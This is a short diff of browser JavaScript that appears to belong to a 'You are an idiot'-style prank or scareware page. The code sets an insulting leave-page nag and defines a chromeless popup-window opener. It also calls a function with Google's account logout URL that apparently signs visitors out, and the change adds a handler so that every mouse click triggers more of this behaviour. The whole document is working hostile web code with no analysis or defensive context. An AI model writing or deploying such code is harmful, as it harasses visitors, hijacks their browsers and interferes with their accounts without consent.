@@ -16,6 +16,7 @@ async function handleClick() {
 	window.onbeforeunload = () => "Are you an idiot?";
 };
 window.onload = playBall;
+onmousedown = handleClick;
 proCreate(3,"https://www.google.com/accounts/Logout")
 function openxWindow(url) {
 	window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
